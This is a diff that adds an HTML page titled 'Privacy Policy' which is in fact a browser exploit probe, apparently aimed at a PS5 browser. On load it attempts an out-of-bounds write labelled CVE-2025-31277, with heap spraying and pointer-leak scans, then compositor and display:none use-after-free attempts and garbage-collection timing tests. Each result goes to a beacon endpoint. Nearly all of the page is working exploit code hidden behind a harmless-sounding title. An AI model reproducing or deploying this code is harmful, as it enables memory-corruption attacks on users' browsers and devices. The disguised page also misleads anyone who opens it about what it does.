@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Privacy Policy</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#1a1a2e;color:#e0e0e0;font-family:monospace;font-size:11px;padding:4px}
+#hud{white-space:pre-wrap;line-height:1.3;max-height:95vh;overflow-y:auto}
+.g{color:#0f0}.r{color:#f44}.y{color:#ff0}.c{color:#0ff}.m{color:#f0f}.w{color:#fff}
+.arena{position:absolute;left:-9999px;top:-9999px}
+</style>
+</head>
+<body>
+<div id="hud"></div>
+<div id="arena" class="arena"></div>
+<script>
+var H=document.getElementById('hud'),AR=document.getElementById('arena');
+function L(c,t){var s=document.createElement('span');s.className=c;s.textContent=t+'\n';H.appendChild(s);H.scrollTop=H.scrollHeight}
+function B(tag,data){try{new Image().src='/en/ps5/beacon.gif?t='+tag+'&d='+encodeURIComponent(data).substring(0,1800)+'&_='+Date.now()}catch(e){}}
+function sleep(ms){return new Promise(function(r){setTimeout(r,ms)})}
+function raf(){return new Promise(function(r){requestAnimationFrame(r)})}
+function raf2(){return new Promise(function(r){requestAnimationFrame(function(){requestAnimationFrame(r)})})}
+
+L('c','=== P1080: COMBINED MEGA PROBE ===');
+L('w','HABT OOB + Compositor UAF + FontFace leak');
+B('P1080-BOOT','combined-mega');
+
+// =========== PART 1: HABT OOB (CVE-2025-31277) ===========
+async function part1(){
+  L('c','\n--- PART 1: HABT OOB ---');
+
+  // 1A: Trigger HABT + basic match array test
+  var habtResult = 'unknown';
+  try {
+    function C1(){}
+    function acc1(a,b){return {__proto__:b}}
+    acc1(C1,C1);
+    Object.defineProperty(C1, 8, {configurable:true, get:acc1, set:acc1});
+
+    for(var i=0;i<5;i++){
+      function C1b(){}
+      Object.defineProperty(C1b, i, {configurable:true, get:function(){}, set:function(){}});
+    }
+
+    var m = ("hello world test data here").match(/\w+/g);
+    var origLen = m ? m.length : 0;
+
+    // Try OOB write
+    var wrote=false, newLen=origLen;
+    if(m){
+      try { m[origLen+5] = 0x41414141; wrote=(m[origLen+5]===0x41414141); newLen=m.length; } catch(e){}
+    }
+
+    habtResult = 'match:'+origLen+'|wrote:'+wrote+'|newLen:'+newLen;
+  } catch(e){ habtResult='ERR:'+e; }
+  L(habtResult.indexOf('wrote:true')>=0?'g':'y','[1A] '+habtResult);
+  B('P1080-1A-HABT', habtResult);
+
+  // 1B: Spray + corruption scan (3 size classes)
+  var corruptResult = 'unknown';
+  try {
+    function C2(){}
+    Object.defineProperty(C2, 3, {configurable:true, get:function(){}, set:function(){}});
+
+    var abs=[], matches=[];
+    var szClasses = [32, 64, 128];
+
+    for(var sci=0; sci<szClasses.length; sci++){
+      var sz = szClasses[sci];
+      for(var i=0; i<800; i++){
+        var ab = new ArrayBuffer(sz);
+        var dv = new DataView(ab);
+        dv.setUint32(0, 0xAA000000|(sci<<16)|i, true);
+        dv.setUint32(sz-4, 0xBB000000|(sci<<16)|i, true);
+        abs.push({ab:ab, sz:sz, sci:sci});
+      }
+    }
+
+    for(var j=0; j<400; j++){
+      matches.push(("a b c d e f").match(/\w/g));
+      if(j%4===0){
+        var ab2 = new ArrayBuffer(64);
+        new DataView(ab2).setUint32(0, 0xCC000000|j, true);
+        abs.push({ab:ab2, sz:64, sci:99});
+      }
+    }
+
+    // OOB writes at indices 8, 12, 16
+    var w8=0, w12=0, w16=0;
+    for(var k=0; k<matches.length; k++){
+      try { matches[k][8]=2.718; if(matches[k][8]===2.718) w8++; } catch(e){}
+      try { matches[k][12]=1.414; if(matches[k][12]===1.414) w12++; } catch(e){}
+      try { matches[k][16]=1.732; if(matches[k][16]===1.732) w16++; } catch(e){}
+    }
+
+    var corrupt = 0, corruptDet = [];
+    for(var n=0; n<abs.length; n++){
+      try {
+        var dv3 = new DataView(abs[n].ab);
+        var hdr = dv3.getUint32(0, true);
+        if((hdr>>>24) !== 0xAA && (hdr>>>24) !== 0xCC){
+          corrupt++;
+          if(corruptDet.length<8) corruptDet.push(n+':sz='+abs[n].sz+':0x'+hdr.toString(16));
+        }
+      } catch(e){ corrupt++; }
+    }
+
+    corruptResult = 'w8:'+w8+'|w12:'+w12+'|w16:'+w16+'|corrupt:'+corrupt+'/'+abs.length;
+    if(corruptDet.length) corruptResult += '|det:'+corruptDet.join(';');
+
+    abs=null; matches=null;
+  } catch(e){ corruptResult='ERR:'+e; }
+  L(corruptResult.indexOf('corrupt:0')<0&&corruptResult.indexOf('corrupt:')>=0?'g':'y','[1B] '+corruptResult);
+  B('P1080-1B-SPRAY', corruptResult);
+
+  // 1C: BigUint64Array pointer read via OOB
+  var ptrResult = 'unknown';
+  try {
+    if(typeof BigUint64Array === 'undefined') throw 'NO_BIGU64';
+
+    function C3(){}
+    Object.defineProperty(C3, 7, {configurable:true, get:function(){}, set:function(){}});
+
+    var bus = [];
+    for(var i=0; i<200; i++){
+      var ab = new ArrayBuffer(64);
+      var bu = new BigUint64Array(ab);
+      bu[0] = BigInt('0xDEADDEADDEADDEAD');
+      bus.push({ab:ab, bu:bu});
+    }
+
+    var matches2 = [];
+    for(var j=0; j<150; j++){
+      matches2.push(("p q r s t").match(/\w/g));
+      var ab2 = new ArrayBuffer(64);
+      new BigUint64Array(ab2)[0] = BigInt('0xBEEFBEEFBEEFBEEF');
+      bus.push({ab:ab2, bu:new BigUint64Array(ab2)});
+    }
+
+    var oobReads = [], markerHits = 0;
+    for(var k=0; k<matches2.length && oobReads.length<15; k++){
+      for(var idx=5; idx<20; idx++){
+        var v = matches2[k][idx];
+        if(v !== undefined && typeof v === 'number'){
+          var f64 = new Float64Array(1);
+          f64[0] = v;
+          var bu3 = new BigUint64Array(f64.buffer);
+          var hex = bu3[0].toString(16);
+          oobReads.push(idx+':0x'+hex);
+          if(hex.indexOf('deaddeaddead')>=0 || hex.indexOf('beefbeefbeef')>=0) markerHits++;
+        }
+      }
+    }
+
+    ptrResult = 'oob:'+oobReads.length+'|markers:'+markerHits;
+    if(oobReads.length) ptrResult += '|data:'+oobReads.slice(0,8).join(';');
+
+    bus=null; matches2=null;
+  } catch(e){ ptrResult='ERR:'+e; }
+  L(ptrResult.indexOf('markers:0')<0?'g':'y','[1C] '+ptrResult);
+  B('P1080-1C-PTRS', ptrResult);
+}
+
+// =========== PART 2: COMPOSITOR UAF ===========
+async function part2(){
+  L('c','\n--- PART 2: COMPOSITOR UAF ---');
+
+  var ROUNDS = 6;
+  var LAYERS = 25;
+  var SPRAY_SIZES = [384, 448, 512, 576, 640];
+  var SPRAY_COUNT = 60;
+  var allHits = [];
+
+  for(var round=0; round<ROUNDS; round++){
+    L('y','  R'+(round+1)+'/'+ROUNDS+'...');
+    try {
+      // Create layers
+      var c = document.createElement('div');
+      c.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:500px;height:500px';
+      AR.appendChild(c);
+
+      for(var i=0; i<LAYERS; i++){
+        var el = document.createElement('div');
+        el.style.cssText = 'width:50px;height:50px;will-change:transform;transform:translateZ(0);'+
+                          'opacity:0.9;position:absolute;left:'+(i*3)+'px;top:'+(i*3)+'px;background:red';
+        c.appendChild(el);
+      }
+
+      await sleep(40);
+      c.offsetHeight;
+      await raf2();
+
+      // MutObs spray
+      var sprayABs = [];
+      var obs = new MutationObserver(function(){
+        for(var si=0; si<SPRAY_SIZES.length; si++){
+          var sz = SPRAY_SIZES[si];
+          for(var j=0; j<SPRAY_COUNT; j++){
+            var ab = new ArrayBuffer(sz);
+            var dv = new DataView(ab);
+            dv.setUint32(0, 0xDD000000|(round<<16)|(si<<8)|j, true);
+            for(var k=4;k<sz;k+=4) dv.setUint32(k, 0x22222222, true);
+            sprayABs.push({ab:ab, sz:sz});
+          }
+        }
+      });
+      obs.observe(c, {childList:true, subtree:true});
+
+      // Remove in RAF
+      await new Promise(function(resolve){
+        requestAnimationFrame(function(){
+          while(c.firstChild) c.removeChild(c.firstChild);
+          // Extra spray inside RAF
+          for(var si=0; si<SPRAY_SIZES.length; si++){
+            var sz = SPRAY_SIZES[si];
+            for(var j=0; j<30; j++){
+              var ab = new ArrayBuffer(sz);
+              new DataView(ab).setUint32(0, 0xEE000000|(round<<16)|(si<<8)|j, true);
+              sprayABs.push({ab:ab, sz:sz});
+            }
+          }
+          resolve();
+        });
+      });
+
+      obs.disconnect();
+      await sleep(80);
+      await raf2();
+
+      // Scan
+      var roundHits = [];
+      for(var n=0; n<sprayABs.length; n++){
+        try {
+          var entry = sprayABs[n];
+          var dv2 = new DataView(entry.ab);
+          var hdr = dv2.getUint32(0, true);
+          var hdrOk = (hdr>>>24)===0xDD || (hdr>>>24)===0xEE;
+
+          if(!hdrOk){
+            var dump = [];
+            for(var h=0;h<Math.min(entry.sz,48);h+=4) dump.push(dv2.getUint32(h,true).toString(16));
+            roundHits.push('H:sz='+entry.sz+':0x'+hdr.toString(16)+'|dump:'+dump.join(','));
+          }
+
+          // Pointer scan
+          if(typeof BigUint64Array !== 'undefined'){
+            var bu = new BigUint64Array(entry.ab);
+            for(var bi=1; bi<Math.min(bu.length,20); bi++){
+              var v = bu[bi];
+              if(v !== BigInt('0x2222222222222222') && v !== BigInt(0) &&
+                 v > BigInt('0x100000000') && v < BigInt('0x800000000000')){
+                if(roundHits.length<15) roundHits.push('P:sz='+entry.sz+'+'+bi*8+':0x'+v.toString(16));
+              }
+            }
+          }
+        } catch(e){}
+      }
+
+      if(roundHits.length){
+        allHits.push({round:round, hits:roundHits});
+        L('g','  R'+(round+1)+': '+roundHits.length+' HITS!');
+        B('P1080-2-HIT', 'r:'+round+'|n:'+roundHits.length+'|'+roundHits.slice(0,3).join('|'));
+      } else {
+        L('w','  R'+(round+1)+': clean ('+sprayABs.length+')');
+      }
+
+      AR.removeChild(c);
+      sprayABs = null;
+    } catch(e){
+      L('r','  R'+(round+1)+' ERR:'+e);
+      B('P1080-2-ERR', 'r:'+round+'|'+e);
+    }
+  }
+
+  var total = allHits.reduce(function(s,r){return s+r.hits.length},0);
+  B('P1080-2-DONE', 'rounds:'+ROUNDS+'|hits:'+total);
+  return total;
+}
+
+// =========== PART 3: display:none UAF variant ===========
+async function part3(){
+  L('c','\n--- PART 3: display:none UAF ---');
+
+  var ROUNDS = 4;
+  var totalHits = 0;
+
+  for(var round=0; round<ROUNDS; round++){
+    try {
+      var c = document.createElement('div');
+      c.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:500px;height:500px';
+      AR.appendChild(c);
+
+      for(var i=0; i<30; i++){
+        var el = document.createElement('div');
+        el.style.cssText = 'width:60px;height:60px;will-change:transform;transform:translateZ(0);'+
+                          'opacity:0.85;position:absolute;left:'+(i*4)+'px;top:'+(i*4)+'px;background:blue';
+        c.appendChild(el);
+      }
+
+      await sleep(30);
+      c.offsetHeight;
+      await raf();
+
+      // Hide -> remove -> spray -> show
+      c.style.display = 'none';
+      await sleep(10);
+      while(c.firstChild) c.removeChild(c.firstChild);
+
+      var spray = [];
+      var sizes = [384, 448, 512, 576, 640];
+      for(var si=0; si<sizes.length; si++){
+        var sz = sizes[si];
+        for(var j=0; j<60; j++){
+          var ab = new ArrayBuffer(sz);
+          var dv = new DataView(ab);
+          dv.setUint32(0, 0xFF000000|(round<<16)|(si<<8)|j, true);
+          for(var k=4;k<sz;k+=4) dv.setUint32(k, 0x33333333, true);
+          spray.push({ab:ab, sz:sz});
+        }
+      }
+
+      c.style.display = '';
+      await sleep(30);
+      c.offsetHeight;
+      await raf2();
+
+      var hits = 0;
+      for(var n=0; n<spray.length; n++){
+        var hdr = new DataView(spray[n].ab).getUint32(0, true);
+        if((hdr>>>24) !== 0xFF) hits++;
+      }
+      totalHits += hits;
+
+      if(hits) {
+        L('g','  R'+(round+1)+': '+hits+' HITS');
+        B('P1080-3-HIT', 'r:'+round+'|h:'+hits);
+      }
+
+      AR.removeChild(c);
+    } catch(e){
+      L('r','  R'+(round+1)+' ERR:'+e);
+    }
+  }
+
+  B('P1080-3-DONE', 'rounds:'+ROUNDS+'|hits:'+totalHits);
+  return totalHits;
+}
+
+// =========== PART 4: WeakRef collection timing ===========
+async function part4(){
+  L('c','\n--- PART 4: WeakRef GC Timing ---');
+
+  if(typeof WeakRef === 'undefined'){
+    B('P1080-4-WEAK', 'NO_WEAKREF');
+    return;
+  }
+
+  var collected = [];
+  var fr = new FinalizationRegistry(function(id){ collected.push({id:id, t:Date.now()}) });
+
+  var c = document.createElement('div');
+  c.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:500px;height:500px';
+  AR.appendChild(c);
+
+  var refs = [];
+  for(var i=0; i<20; i++){
+    var el = document.createElement('div');
+    el.style.cssText = 'width:40px;height:40px;will-change:transform;transform:translateZ(0);'+
+                      'opacity:0.8;position:absolute;left:'+(i*3)+'px;top:'+(i*3)+'px;background:purple';
+    c.appendChild(el);
+    refs.push(new WeakRef(el));
+    fr.register(el, 'el_'+i);
+  }
+
+  await sleep(40);
+  c.offsetHeight;
+  await raf();
+
+  var t0 = Date.now();
+  while(c.firstChild) c.removeChild(c.firstChild);
+
+  // GC pressure
+  for(var g=0; g<30; g++){
+    new ArrayBuffer(131072);
+    await sleep(10);
+  }
+
+  var alive = refs.filter(function(r){return r.wr ? r.wr.deref() : r.deref()}).length;
+  var elapsed = Date.now() - t0;
+
+  var result = 'alive:'+alive+'/20|collected:'+collected.length+'|elapsed:'+elapsed+'ms';
+  if(collected.length){
+    var delays = collected.slice(0,5).map(function(c2){return c2.t-t0});
+    result += '|delays:'+delays.join(',');
+  }
+  L('y','[4] '+result);
+  B('P1080-4-WEAK', result);
+
+  AR.removeChild(c);
+}
+
+// =========== RUN ALL ===========
+(async function(){
+  try {
+    await part1();
+    var uafHits = await part2();
+    var dispHits = await part3();
+    await part4();
+
+    L('c','\n=== P1080 SUMMARY ===');
+    var summary = 'uafHits:'+uafHits+'|dispHits:'+dispHits;
+    L(uafHits||dispHits?'g':'y', summary);
+    B('P1080-DONE', summary);
+    L('g','=== COMPLETE ===');
+  } catch(e){
+    L('r','FATAL:'+e);
+    B('P1080-FATAL', ''+e);
+  }
+})();
+</script>
+</body>
+</html>
